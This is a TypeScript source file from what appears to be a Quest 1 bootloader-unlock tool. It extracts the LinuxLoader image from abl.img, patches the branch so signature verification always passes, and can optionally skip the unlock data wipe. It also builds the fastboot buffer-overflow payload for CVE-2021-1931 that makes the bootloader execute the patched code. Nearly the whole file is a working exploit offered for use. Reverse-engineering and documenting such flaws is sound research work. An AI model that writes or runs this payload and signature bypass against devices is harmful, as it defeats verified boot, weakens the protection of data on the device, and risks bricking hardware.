/**
 * Extracts the LinuxLoader UEFI application out of a Qualcomm `abl.img` and
 * builds the fastboot overflow payload that patches its signature check.
 *
 * abl.img layout on the Quest 1:
 *
 *   ELF32 (EM_ARM)
 *     └── PT_LOAD @0x3000, 0x40000 bytes, loaded at 0x9fa00000
 *           └── EFI firmware volume (EFI_FIRMWARE_FILE_SYSTEM2_GUID)
 *                 └── one FFS file, type 0x0b (FIRMWARE_VOLUME_IMAGE)
 *                       └── GUID_DEFINED section, LZMA_CUSTOM_DECOMPRESS
 *                             └── inner firmware volume
 *                                   └── FFS file "LinuxLoader", type 0x09
 *                                         └── PE32 section  <- what we want
 *
 * The exploit itself is CVE-2021-1931, a buffer overflow in the fastboot
 * download path; see darknight1050/quest-bootloader-unlocker, which this
 * reimplements for the single build we downgrade to.
 */

import lzmaModule from "lzma/src/lzma-d-min.js";

const { LZMA } = lzmaModule;

/** EFI_FIRMWARE_FILE_SYSTEM2_GUID, little-endian byte order as stored. */
const FFS2_GUID = "8c8ce578-8a3d-4f1c-9935-896185c32dd3";
/** LZMA_CUSTOM_DECOMPRESS_GUID. */
const LZMA_GUID = "ee4e5898-3914-4259-9d6e-dc7bd79403cf";

const SECTION_GUID_DEFINED = 0x02;
const SECTION_PE32 = 0x10;
const SECTION_UI = 0x15;

/** Bytes the overflow writes before the copied image starts. */
export const OVERFLOW = 0x100000;
/** Filler byte the reference implementation uses for the overflow region. */
export const FILLER = 0x0c;

/** One byte-level edit to the extracted PE32 image. */
export interface AblEdit {
    /** Offset into the extracted PE32 image. */
    readonly offset: number;
    /** Bytes expected at that offset before patching. */
    readonly expect: readonly number[];
    /** Bytes to write. */
    readonly replace: readonly number[];
}

/**
 * A build's patch, as an ordered list of edits.
 *
 * Some builds need more than one site — the Quest 2 v9248600200800000 patch in
 * the reference implementation touches four — so this is a list even where a
 * single edit suffices. Edits are validated as a set before any of them is
 * written, so a patch never lands half-applied.
 */
export type AblPatch = readonly AblEdit[];

/** Offset just past the last byte any edit writes. */
export function patchEnd(patch: AblPatch): number {
    return patch.reduce(
        (end, edit) => Math.max(end, edit.offset + edit.replace.length),
        0,
    );
}

/**
 * Build 16476800119700000 (Quest 1, v29.0.0.66) — the verification bypass.
 *
 * `c9 04 00 54` is `b.ls +0x98`, the branch that skips past the failure path
 * when verification succeeds. Replacing it with `b6 00 00 14` (`b +0x2d8`)
 * makes that jump unconditional, so verification never fails.
 *
 * This is the patch the unlock needs; everything else is optional.
 */
export const PATCH_16476800119700000: AblPatch = [
    {
        offset: 0x3777c,
        expect: [0xc9, 0x04, 0x00, 0x54],
        replace: [0xb6, 0x00, 0x00, 0x14],
    },
];

/**
 * Optional edit: unlock without erasing user data.
 *
 * At 0x37a70 the bootloader does `tst w20, #0xff` and, at 0x37a74,
 * `b.ne 0x37ab4`. When that branch is *not* taken it runs the block at
 * 0x37a78-0x37ab0, which calls the same routine three times with the UTF-16
 * partition names "userdata", "misc" and "metadata" — the wipe an unlock
 * performs.
 *
 * `10 00 00 14` is `b +0x40`: the branch's own destination, made
 * unconditional. The block's success path already ends at that same address
 * (`tbz x0, #0x3f, #0x37ab4` at 0x37aa4), so this lands exactly where the code
 * would have gone had all three calls succeeded — the wipe is skipped and the
 * surrounding control flow is untouched.
 *
 * Not enabled by default. On Android 10 `/data` is encrypted with keys bound
 * to the verified-boot state, so changing lock state without wiping can leave
 * `/data` undecryptable — which ends in a forced reset anyway. Whether the
 * Quest 1 behaves that way is not something static analysis can answer.
 */
export const SKIP_WIPE_16476800119700000: AblEdit = {
    offset: 0x37a74,
    expect: [0x01, 0x02, 0x00, 0x54],
    replace: [0x10, 0x00, 0x00, 0x14],
};

export interface UnlockPatchOptions {
    /** Leave userdata, misc and metadata intact. Default false. */
    readonly skipWipe?: boolean;
}

/** The patch to apply, given what the user asked for. */
export function unlockPatch({ skipWipe = false }: UnlockPatchOptions = {}): AblPatch {
    return skipWipe
        ? [...PATCH_16476800119700000, SKIP_WIPE_16476800119700000]
        : PATCH_16476800119700000;
}

function u16(d: Uint8Array, o: number): number {
    return d[o]! | (d[o + 1]! << 8);
}

function u32(d: Uint8Array, o: number): number {
    return (d[o]! | (d[o + 1]! << 8) | (d[o + 2]! << 16) | (d[o + 3]! << 24)) >>> 0;
}

/** FFS sizes are 24-bit little-endian. */
function u24(d: Uint8Array, o: number): number {
    return d[o]! | (d[o + 1]! << 8) | (d[o + 2]! << 16);
}

function guid(d: Uint8Array, o: number): string {
    const hex = (i: number) => d[o + i]!.toString(16).padStart(2, "0");
    return (
        `${hex(3)}${hex(2)}${hex(1)}${hex(0)}-${hex(5)}${hex(4)}-` +
        `${hex(7)}${hex(6)}-${hex(8)}${hex(9)}-` +
        `${hex(10)}${hex(11)}${hex(12)}${hex(13)}${hex(14)}${hex(15)}`
    );
}

/** Returns the PT_LOAD segment that holds a firmware volume. */
function findFirmwareVolumeSegment(abl: Uint8Array): Uint8Array {
    if (abl[0] !== 0x7f || abl[1] !== 0x45 || abl[2] !== 0x4c || abl[3] !== 0x46) {
        throw new Error("abl.img is not an ELF");
    }
    if (abl[4] !== 1) {
        throw new Error("abl.img is not ELF32 as expected for the Quest 1");
    }

    const phoff = u32(abl, 0x1c);
    const phentsize = u16(abl, 0x2a);
    const phnum = u16(abl, 0x2c);

    for (let i = 0; i < phnum; i++) {
        const ph = phoff + i * phentsize;
        const offset = u32(abl, ph + 4);
        const filesz = u32(abl, ph + 16);
        if (filesz < 0x48) {
            continue;
        }
        const seg = abl.subarray(offset, offset + filesz);
        if (isFirmwareVolume(seg)) {
            return seg;
        }
    }
    throw new Error("no UEFI firmware volume found in abl.img");
}

function isFirmwareVolume(d: Uint8Array): boolean {
    return (
        d.length >= 0x48 &&
        d[0x28] === 0x5f && // '_'
        d[0x29] === 0x46 && // 'F'
        d[0x2a] === 0x56 && // 'V'
        d[0x2b] === 0x48 && // 'H'
        guid(d, 0x10) === FFS2_GUID
    );
}

interface FfsSection {
    readonly type: number;
    readonly start: number;
    readonly data: Uint8Array;
}

interface FfsFile {
    readonly type: number;
    readonly name: string;
    readonly ui: string;
    readonly sections: readonly FfsSection[];
}

/** Walks the FFS files of a firmware volume, honouring the extended header. */
function parseFirmwareVolume(fv: Uint8Array): FfsFile[] {
    const fvLength = Number(new DataView(fv.buffer, fv.byteOffset, fv.byteLength).getBigUint64(0x20, true));
    const headerLength = u16(fv, 0x30);
    const extHeaderOffset = u16(fv, 0x34);

    let off = headerLength;
    if (extHeaderOffset !== 0) {
        // ExtHeaderSize is a u32 at +0x10 of the extended header.
        off = (extHeaderOffset + u32(fv, extHeaderOffset + 0x10) + 7) & ~7;
    }

    const end = Math.min(fvLength, fv.length);
    const files: FfsFile[] = [];

    while (off + 24 <= end) {
        let empty = true;
        for (let i = 0; i < 16; i++) {
            if (fv[off + i] !== 0xff) {
                empty = false;
                break;
            }
        }
        if (empty) {
            break;
        }

        const size = u24(fv, off + 20);
        if (size < 24 || size === 0xffffff || off + size > end) {
            break;
        }

        const type = fv[off + 18]!;
        const sections: FfsSection[] = [];
        let ui = "";

        let so = off + 24;
        const fileEnd = off + size;
        while (so + 4 <= fileEnd) {
            const ssize = u24(fv, so);
            const stype = fv[so + 3]!;
            if (ssize < 4 || so + ssize > fileEnd) {
                break;
            }
            const data = fv.subarray(so + 4, so + ssize);
            if (stype === SECTION_UI) {
                ui = new TextDecoder("utf-16le").decode(data).replace(/\0+$/, "");
            }
            sections.push({ type: stype, start: so, data });
            so = (so + ssize + 3) & ~3;
        }

        files.push({ type, name: guid(fv, off), ui, sections });
        off = (off + size + 7) & ~7;
    }

    return files;
}

function decompressLzma(blob: Uint8Array): Promise<Uint8Array> {
    return new Promise((resolve, reject) => {
        // LZMA-JS wants a plain array and hands back signed bytes.
        LZMA.decompress(Array.from(blob), (result, error) => {
            if (error) {
                reject(new Error(`LZMA decompression failed: ${error.message}`));
                return;
            }
            if (typeof result === "string") {
                reject(new Error("LZMA decompression returned text, expected bytes"));
                return;
            }
            const out = new Uint8Array(result.length);
            for (let i = 0; i < result.length; i++) {
                out[i] = result[i]! & 0xff;
            }
            resolve(out);
        });
    });
}

/**
 * Pulls the LinuxLoader PE32 image out of an `abl.img`.
 *
 * Descends exactly one level of LZMA-compressed firmware volume, which is the
 * shape every Quest 1 abl uses.
 */
export async function extractLinuxLoaderPe(abl: Uint8Array): Promise<Uint8Array> {
    const outerFv = findFirmwareVolumeSegment(abl);

    const compressed = parseFirmwareVolume(outerFv)
        .flatMap((file) => file.sections)
        .find(
            (section) =>
                section.type === SECTION_GUID_DEFINED &&
                guid(section.data, 0) === LZMA_GUID,
        );
    if (!compressed) {
        throw new Error("abl.img has no LZMA-compressed firmware volume section");
    }

    // GUID_DEFINED payload starts at DataOffset, measured from the section head.
    const dataOffset = u16(compressed.data, 16);
    const inner = await decompressLzma(
        outerFv.subarray(compressed.start + dataOffset, compressed.start + 4 + compressed.data.length),
    );

    // The decompressed blob is a section stream; the volume sits inside it.
    let fvStart = -1;
    for (let i = 0; i + 0x48 <= inner.length; i += 4) {
        if (isFirmwareVolume(inner.subarray(i))) {
            fvStart = i;
            break;
        }
    }
    if (fvStart < 0) {
        throw new Error("no inner firmware volume after decompression");
    }

    const pe = parseFirmwareVolume(inner.subarray(fvStart))
        .filter((file) => file.ui === "LinuxLoader" || file.type === 0x09)
        .flatMap((file) => file.sections)
        .find((section) => section.type === SECTION_PE32);
    if (!pe) {
        throw new Error("no LinuxLoader PE32 section in the inner firmware volume");
    }
    if (pe.data[0] !== 0x4d || pe.data[1] !== 0x5a) {
        throw new Error("LinuxLoader section does not start with an MZ header");
    }

    return pe.data;
}

const hex = (bytes: Iterable<number>) =>
    Array.from(bytes)
        .map((b) => b.toString(16).padStart(2, "0"))
        .join(" ");

/**
 * Applies every edit in place, after checking all of them.
 *
 * Validation is a separate pass on purpose: writing edit 1 and then finding
 * edit 2 does not match would leave a half-patched image that still looks
 * usable. Nothing is written unless the whole patch fits the image.
 */
export function applyPatch(pe: Uint8Array, patch: AblPatch): void {
    if (patch.length === 0) {
        throw new Error("patch contains no edits");
    }

    const problems: string[] = [];
    for (const { offset, expect } of patch) {
        if (offset + expect.length > pe.length) {
            problems.push(
                `offset 0x${offset.toString(16)} runs past the end of the ${pe.length}-byte image`,
            );
            continue;
        }
        const actual = pe.subarray(offset, offset + expect.length);
        for (let i = 0; i < expect.length; i++) {
            if (actual[i] !== expect[i]) {
                problems.push(
                    `at 0x${offset.toString(16)}: got ${hex(actual)}, expected ${hex(expect)}`,
                );
                break;
            }
        }
    }

    if (problems.length > 0) {
        throw new Error(
            `this abl.img is not the build these patches were written for — nothing was ` +
                `applied:\n  ${problems.join("\n  ")}`,
        );
    }

    for (const { offset, replace } of patch) {
        pe.set(replace, offset);
    }
}

/**
 * Builds the buffer sent to the fastboot bulk endpoint.
 *
 * Layout: `OVERFLOW` bytes of filler, then the patched image truncated just
 * past the last patched byte. Overrunning the receive buffer by exactly this
 * much lands the patched copy where the bootloader will execute it.
 */
export function buildUnlockPayload(patchedPe: Uint8Array, patch: AblPatch): Uint8Array {
    const end = patchEnd(patch);
    const payload = new Uint8Array(OVERFLOW + end).fill(FILLER);
    payload.set(patchedPe.subarray(0, end), OVERFLOW);
    return payload;
}

/** abl.img -> payload, with the patch verified against the real bytes. */
export async function buildUnlockPayloadFromAbl(
    abl: Uint8Array,
    patch: AblPatch = PATCH_16476800119700000,
): Promise<{ payload: Uint8Array; pe: Uint8Array }> {
    const pe = await extractLinuxLoaderPe(abl);
    applyPatch(pe, patch);
    return { payload: buildUnlockPayload(pe, patch), pe };
}
